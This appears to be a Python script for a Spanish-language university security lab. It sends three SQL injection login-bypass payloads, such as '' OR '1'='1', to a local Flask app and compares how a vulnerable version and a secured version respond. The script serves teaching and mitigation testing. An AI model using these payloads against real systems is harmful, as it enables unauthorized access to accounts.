
"""
Práctica Experimental 4 - Seguridad Informática

Módulo: Pruebas automatizadas de SQL Injection.

Objetivo:
Evaluar tres payloads contra el formulario de inicio
de sesión de una aplicación Flask local y autorizada.

Permite comparar los resultados obtenidos contra
la aplicación vulnerable y la aplicación segura.

Uso exclusivamente académico.
"""

import argparse
import requests


URL = "http://127.0.0.1:5000/login"

PAYLOADS = [
    {
        "nombre": "Prueba 1 - Comentario SQL",
        "usuario": "admin' --",
        "descripcion": (
            "Intenta comentar la comprobación de contraseña "
            "para acceder como el usuario admin."
        )
    },
    {
        "nombre": "Prueba 2 - Condición OR verdadera",
        "usuario": "' OR '1'='1",
        "descripcion": (
            "Intenta alterar la condición WHERE mediante "
            "una expresión que siempre es verdadera."
        )
    },
    {
        "nombre": "Prueba 3 - Condición OR con comentario",
        "usuario": "x' OR '1'='1' --",
        "descripcion": (
            "Combina una condición verdadera con un "
            "comentario SQL para modificar la autenticación."
        )
    }
]


def evaluar_respuesta(respuesta):
    """Clasifica el resultado según el mensaje de Flask."""

    if respuesta.status_code != 200:
        return "RESPUESTA HTTP INESPERADA"

    contenido = respuesta.text.lower()

    if "acceso concedido" in contenido:
        return "ACCESO CONCEDIDO"

    if "usuario o contraseña incorrectos" in contenido:
        return "ACCESO RECHAZADO"

    if "error en la consulta sql" in contenido:
        return "ERROR SQL"

    return "NO DETERMINADO"


def ejecutar_pruebas(modo):
    """Ejecuta las tres pruebas y muestra un resumen."""

    print("=" * 60)
    print("PRÁCTICA EXPERIMENTAL 4 - SEGURIDAD INFORMÁTICA")
    print("PRUEBAS AUTOMATIZADAS DE SQL INJECTION")
    print("=" * 60)

    print(f"Aplicación evaluada: {modo.upper()}")
    print(f"URL: {URL}")
    print("Entorno: LOCAL AUTORIZADO")

    resultados = []

    for numero, prueba in enumerate(PAYLOADS, start=1):

        print("\n" + "-" * 60)
        print(f"PRUEBA {numero}")
        print("-" * 60)

        print("Nombre:", prueba["nombre"])
        print("Descripción:", prueba["descripcion"])
        print("Payload:", prueba["usuario"])

        datos = {
            "username": prueba["usuario"],
            "password": "password123"
        }

        try:
            respuesta = requests.post(
                URL,
                data=datos,
                timeout=10,
                allow_redirects=True
            )

            resultado = evaluar_respuesta(respuesta)

            print("Código HTTP:", respuesta.status_code)
            print("Resultado:", resultado)

            if resultado == "ACCESO CONCEDIDO":
                print(
                    "Se consiguió acceder sin utilizar "
                    "la contraseña legítima."
                )

            elif resultado == "ACCESO RECHAZADO":
                print(
                    "La aplicación rechazó el intento "
                    "de inicio de sesión."
                )

            elif resultado == "ERROR SQL":
                print(
                    "El payload produjo un error "
                    "en la consulta SQL."
                )

            else:
                print(
                    "No se pudo confirmar el resultado. "
                    "Revisar la respuesta del servidor."
                )

            resultados.append({
                "prueba": numero,
                "payload": prueba["usuario"],
                "codigo_http": respuesta.status_code,
                "resultado": resultado
            })

        except requests.exceptions.RequestException as error:

            print("ERROR DE CONEXIÓN:", error)

            resultados.append({
                "prueba": numero,
                "payload": prueba["usuario"],
                "codigo_http": "N/A",
                "resultado": "ERROR DE CONEXIÓN"
            })

    print("\n" + "=" * 60)
    print("RESUMEN DE RESULTADOS")
    print("=" * 60)

    exitos = 0
    rechazos = 0

    for registro in resultados:

        print(
            f"Prueba {registro['prueba']}: "
            f"{registro['resultado']} "
            f"(HTTP: {registro['codigo_http']})"
        )

        if registro["resultado"] == "ACCESO CONCEDIDO":
            exitos += 1

        elif registro["resultado"] == "ACCESO RECHAZADO":
            rechazos += 1

    print("\nTotal de pruebas:", len(resultados))
    print("Accesos concedidos:", exitos)
    print("Accesos rechazados:", rechazos)

    print("\nINTERPRETACIÓN:")

    if modo == "vulnerable":

        if exitos > 0:
            print(
                "Se confirmó que al menos un payload "
                "permite eludir la autenticación."
            )
        else:
            print(
                "No se consiguió demostrar un acceso "
                "no autorizado con estos payloads."
            )

    elif modo == "segura":

        if exitos == 0 and rechazos == len(resultados):
            print(
                "Los tres intentos fueron rechazados. "
                "La mitigación superó estas pruebas."
            )

        elif exitos > 0:
            print(
                "ADVERTENCIA: Se detectaron accesos "
                "concedidos durante las pruebas."
            )

        else:
            print(
                "Los resultados no permiten confirmar "
                "completamente la mitigación."
            )

    print("\nPruebas finalizadas.")


if __name__ == "__main__":

    parser = argparse.ArgumentParser(
        description=(
            "Pruebas SQL Injection para una aplicación "
            "Flask local autorizada."
        )
    )

    parser.add_argument(
        "--modo",
        choices=["vulnerable", "segura"],
        default="vulnerable",
        help="Tipo de aplicación que se está evaluando."
    )

    argumentos = parser.parse_args()

    ejecutar_pruebas(argumentos.modo)
